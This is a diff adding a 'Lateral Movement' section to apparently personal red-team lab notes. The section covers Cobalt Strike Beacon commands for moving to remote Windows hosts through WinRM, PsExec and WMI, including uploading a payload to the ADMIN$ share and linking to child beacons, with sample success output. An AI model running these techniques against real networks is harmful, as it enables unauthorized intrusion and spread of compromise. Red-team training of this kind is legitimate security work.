@@ -306,19 +306,87 @@ TODO Add this
 
 
 
-## Post Compromise - Lateral Movement
+## Lateral Movement
 
+Cobalt Strike provides three strategies for executing Beacons/code/commands on remote targets. Most lateral movement techniques leverage legitimate Windows management functionality, as this type of traffic and activity is not unusual to see on a network.
 
+### Cobalt Strike Commands
 
-TODO: Add checklist depending on the type of credential harvested and what technique(s) to use for that cred. (NTLM, AES, TGT, plaintext)
+#### jump
 
+* ```
+  beacon> jump
+  ```
 
+#### remote-exec
+
+&#x20;The user remote-exec you need to connect to P2P Beacons manually using `connect` or `link.`
+
+* ```
+  beacon> remote-exec
+  ```
+
+#### execute-assembly
+
+This is entirely custom. Custom methods can be integrated into the `jump` and `remote-exec` commands using Aggressor.
+
+* ```
+  beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
+  ```
+
+### Windows Remote Management
+
+The `winrm` and `winrm64` CS methods can be used for 32 and 64-bit targets as appropriate. The new beacon will run inside [wsmprovhost.exe](https://www.manageengine.com/log-management/correlation-rules/wsmprovhost-lolbas-execution.html)
+
+*   ```
+    beacon> jump winrm64 web.rotta.lab smb
+    ```
+
+    ```
+    [+] established link to child beacon: 10.10.122.30
+    ```
+
+### PsExec
+
+The PsExec commands upload a service binary to the target system, then creates and starts a Windos service to execute the binary. Beacons spawned this way run as SYSTEM.
+
+Copies Binary to target:
+
+* ```
+  beacon> jump psexec64 web.rotta.lab smb
+  [+] established link to child beacon: 10.10.122.30
+  ```
+
+Doesn't copy binary but runs Powershell
+
+* ```
+  beacon> jump psexec_psh web smb
+  [+] established link to child beacon: 10.10.122.30
+  ```
+
+### Windows Management Instrumentation (WMI)
+
+WMI is not part of `jump` command but part of `remote-exec`. This will be a child of [WmiPrvSE.exe](https://www.lifewire.com/what-is-the-wmiprvse-exe-process-4775428).
+
+Upload binary to target and run.
+
+*   <pre><code><strong>beacon> cd \\web.rotta.lan\ADMIN$
+    </strong></code></pre>
+
+    ```
+    beacon> upload C:\Payloads\smb_x64.exe
+    beacon> remote-exec wmi web.rotta.lab C:\Windows\smb_x64.exe
+    ```
+
+Connect to target:
+
+* ```
+  beacon> link web.rotta.lab <TSVCPIPE-pipe>
+  ```
 
 ##
 
-
-
-
+##
 
 ## Post Compromise - Internal Phishing
 
